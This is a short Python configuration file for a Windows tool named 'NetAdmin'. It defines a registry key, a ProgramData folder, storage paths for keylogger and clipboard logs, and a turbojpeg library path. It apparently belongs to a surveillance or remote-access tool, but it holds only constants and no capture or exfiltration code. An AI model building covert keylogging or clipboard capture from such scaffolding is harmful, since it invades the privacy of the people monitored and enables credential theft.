import os
import winreg
from os import path

REGISTRY_KEY_PATH = (winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration") # (key, sub_key)
PROGRAMDATA_NETADMIN_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\") #in programdata
KEYLOGGER_FILE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylogger.txt") #in programdata
CLIPBOARD_FILE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\clipboard.txt") #in programdata
TURBOJPEG_PATH = path.abspath(path.join(path.dirname(__file__), 'lib_bin/turbojpeg-bin/turbojpeg.dll')) # found in MUI